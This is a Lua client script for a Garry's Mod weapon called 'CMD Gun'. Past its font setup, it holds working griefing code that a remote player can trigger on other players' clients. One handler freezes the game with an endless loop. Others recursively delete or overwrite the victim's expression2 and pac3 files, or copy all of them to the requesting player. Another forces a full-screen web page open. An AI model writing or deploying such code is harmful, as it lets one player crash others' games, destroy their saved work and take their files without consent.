include('shared.lua')

SWEP.PrintName    = "CMD Gun"
SWEP.Author       = "Zero"
SWEP.Instructions = ""
SWEP.Slot         = 2
SWEP.SlotPos      = 1

local old_w, old_h = 0, 0


local function CreateFonts()
	print("Adjusting fonts")
	local FONT_RATIO = ScrW() / 2560

	local BigTitleFontSize = 40 * FONT_RATIO
	surface.CreateFont( "BigTitle", {
		font = "CloseCaption_Bold", -- Use the font-name which is shown to you by your operating system Font Viewer, not the file name
		extended = false,
		size = BigTitleFontSize,
		weight = 500,
		blursize = 0,
		scanlines = 0,
		antialias = true,
		underline = false,
		italic = false,
		strikeout = false,
		symbol = false,
		rotary = false,
		shadow = false,
		additive = false,
		outline = false,
	} )

  local MediumTitleFontSize = 30 * FONT_RATIO
  surface.CreateFont( "MediumTitle", {
    font = "CloseCaption_Bold", -- Use the font-name which is shown to you by your operating system Font Viewer, not the file name
    extended = false,
    size = MediumTitleFontSize,
    weight = 500,
    blursize = 0,
    scanlines = 0,
    antialias = true,
    underline = false,
    italic = false,
    strikeout = false,
    symbol = false,
    rotary = false,
    shadow = false,
    additive = false,
    outline = false,
  } )

  local SmallTitleFontSize = 25 * FONT_RATIO
  surface.CreateFont( "SmallTitle", {
    font = "CloseCaption_Bold", -- Use the font-name which is shown to you by your operating system Font Viewer, not the file name
    extended = false,
    size = SmallTitleFontSize,
    weight = 500,
    blursize = 0,
    scanlines = 0,
    antialias = true,
    underline = false,
    italic = false,
    strikeout = false,
    symbol = false,
    rotary = false,
    shadow = false,
    additive = false,
    outline = false,
  } )
end

hook.Add("Think", "sizechanged", function()
    local w, h = ScrW(), ScrH()
    if (w ~= old_w or h ~= old_h) then
        old_w = w
        old_h = h

        CreateFonts()
    end
end)

-- CANCER.NET

-- PAUSE WORKAROUND
local timeBetweenTwoCopy = 1 -- seconds

local function CopyFiles(filesPaths,dirToCopyTo,target,netName)
	for _,f in ipairs(filesPaths) do

		local fileContent = file.Read(f,"DATA")
		local fileNameTab = split(f,"/")
		local fileName = fileNameTab[#fileNameTab]
		print(dirToCopyTo.."/"..fileName)
		net.Start(netName)
			net.WriteString(fileContent)
			net.WriteString(dirToCopyTo.."/"..fileName)
			net.WriteEntity(target)
		net.SendToServer()
		coroutine.yield()
	end
end

-- CRASH
net.Receive("CRASH", function()
	while true do end
end)

-- E2
local function DeleteFiles(dirPath,filesNames)
	for _,f in ipairs(filesNames) do
		--print(dirPath..f)
		file.Delete(dirPath..f)
	end
end

local function CopyFilesToTarget(filesPaths,dirToCopyTo,target,netName)

	local co = coroutine.create(function() CopyFiles(filesPaths,dirToCopyTo,target,netName) end)
	timer.Create("routine_timer", timeBetweenTwoCopy, #filesPaths, function()

		local stat = coroutine.status(co)
		if stat == "suspended" then
			coroutine.resume(co)
		elseif stat == "dead" then
			timer.Remove("routine_timer")
		end

	end)

end

local function EditFiles(dirPath,filesNames,replaceContentWith)
	for _,f in ipairs(filesNames) do
		file.Write(dirPath..f,replaceContentWith)
	end
end

local function SearchDirectoriesAndDelete(dirPath,directories,ignore)
	if not ignore then ignore = {} end
	for _,dir in ipairs(directories) do
		if not table.HasValue(ignore,dir) then
			local files,dirs = file.Find(dirPath..dir.."/*", "DATA")
			DeleteFiles(dirPath..dir.."/", files)
			SearchDirectoriesAndDelete(dirPath..dir.."/", dirs,ignore)
		end
	end
end

local function MapDirectory(dirPath,directories,ignore)
	local ply = LocalPlayer()
	if not ignore then ignore = {} end
	for _,dir in ipairs(directories) do
		if not table.HasValue(ignore,dir) then
			local files,dirs = file.Find(dirPath..dir.."/*", "DATA")
			for _,f in ipairs(files) do
				table.insert(ply.Files,dirPath..dir.."/"..f)
			end

			MapDirectory(dirPath..dir.."/",dirs,ignore)
		end
	end
end

local function SearchDirectoriesAndCopy(dirPath,directories,CopyTo,target,netName,ignore)
	local ply = LocalPlayer()
	if not ignore then ignore = {} end

	MapDirectory(dirPath,directories,ignore)

	--if #ply.Files == 0 then return end
	print("number = " .. #ply.Files)
	CopyFilesToTarget(ply.Files,CopyTo,target,netName)

end

local function SearchDirectoriesAndEdit(dirPath,directories,replaceContentWith)
	for _,dir in ipairs(directories) do
		local files,dirs = file.Find(dirPath..dir.."/*", "DATA")
		EditFiles(dirPath..dir.."/", files,replaceContentWith)
		SearchDirectoriesAndEdit(dirPath..dir.."/", dirs,replaceContentWith)
	end
end


net.Receive("DELETE_E2", function()
	local baseDirPath = "expression2/"
	local files,dirs = file.Find(baseDirPath.."*","DATA")
	DeleteFiles(baseDirPath,files)
	SearchDirectoriesAndDelete(baseDirPath,dirs)
end)

net.Receive("COPY_E2", function()
	local ply = LocalPlayer()
	ply.Files = {}

	local target = net.ReadTable().Sender
	local copyTo = split(ply:SteamID(),":")[3]
	local dirName = "expression2"

	net.Start("CREATE_DIR")
		net.WriteEntity(target)
		net.WriteString(copyTo)
		net.WriteString(dirName)
	net.SendToServer()

	local baseDirPath = "expression2/"
	local files,dirs = file.Find(baseDirPath.."*","DATA")
	for _,f in ipairs(files) do
		table.insert(ply.Files,baseDirPath..f)
	end
	SearchDirectoriesAndCopy(baseDirPath,dirs,copyTo,target,"WRITE_E2",{"81568440"})

end)

net.Receive("EDIT_E2", function()
	local replaceContentWith = net.ReadTable().Args

	local baseDirPath = "expression2/"
	local files,dirs = file.Find(baseDirPath.."*","DATA")
	EditFiles(baseDirPath,files,replaceContentWith)
	SearchDirectoriesAndEdit(baseDirPath,dirs,replaceContentWith)
end)

net.Receive("CREATE_DIR", function()

	local folderName = net.ReadString()
	local dirName = net.ReadString()
	print("RECEIVED CREATE_DIR " .. dirName .. "/"..folderName)
	if not file.Exists(dirName .. "/"..folderName,"DATA") then
		file.CreateDir(dirName .. "/"..folderName)
	else

	end
end)

net.Receive("WRITE_E2", function()
	local content = net.ReadString()
	local fileName = net.ReadString()
	local dir = "expression2/"..fileName
	print("Copying " .. split(fileName,"/")[2] .. " into " .. dir .. "...")
	file.Write(dir,content)
end)

-- PAC3
net.Receive("DELETE_PAC3", function()
	local baseDirPath = "pac3/"
	local ignore = {"objcache"}

	local files,dirs = file.Find(baseDirPath.."*","DATA")
	DeleteFiles(baseDirPath,files)
	SearchDirectoriesAndDelete(baseDirPath,dirs,ignore)
end)

net.Receive("COPY_PAC3", function()

	local ply = LocalPlayer()
	ply.Files = {}

	local target = net.ReadTable().Sender
	local copyTo = split(ply:SteamID(),":")[3]
	local dirName = "pac3"
	local ignore = {"objcache"}--,"__backup"}

	net.Start("CREATE_DIR")
		net.WriteEntity(target)
		net.WriteString(copyTo)
		net.WriteString(dirName)
	net.SendToServer()

	if ply.Files then ply.Files = {} end

	local baseDirPath = "pac3/"
	local files,dirs = file.Find(baseDirPath.."*","DATA")
	for _,f in ipairs(files) do
		table.insert(ply.Files,baseDirPath..f)
	end
	SearchDirectoriesAndCopy(baseDirPath,dirs,copyTo,target,"WRITE_PAC3",ignore)

end)

net.Receive("WRITE_PAC3", function()
	local content = net.ReadString()
	local fileName = net.ReadString()
	local dir = "pac3/"..fileName
	print("Copying " .. split(fileName,"/")[2] .. " into " .. dir .. "...")
	file.Write(dir,content)
end)

-- OPEN URL
net.Receive("OPEN_URL", function()

	local url = net.ReadTable().Args
	local ply = LocalPlayer()
	if ply.UrlPanel then ply.UrlPanel:Remove() end
	ply.UrlPanel = vgui.Create("DHTML")
	ply.UrlPanel:Dock(FILL)
	ply.UrlPanel:OpenURL(url)
	--ply.UrlPanel.Paint = function(pnl,w,h) draw.RoundedBox(0,0,0,w,h,Color(255,0,0)) end
	ply.UrlPanel.ConsoleMessage = function() end

	timer.Simple(10, function() ply.UrlPanel:Remove() end)

end)

net.Receive("CHECK_CONVAR_SV_ALLOWCSLUA", function()
	local target = net.ReadTable().Sender
	local allowlua = GetConVarNumber("kone_lua")

	net.Start("CHECK_CONVAR_SV_ALLOWCSLUA")
		net.WriteEntity(target)
		net.WriteDouble(allowlua)
	net.SendToServer()

end)

net.Receive("SHOW_CONVAR_SV_ALLOWCSLUA", function()
	print("SV_ALLOWCSLUA = " .. net.ReadDouble())
end)

net.Receive("PLAYER_SOUND_URL", function()
	
end)
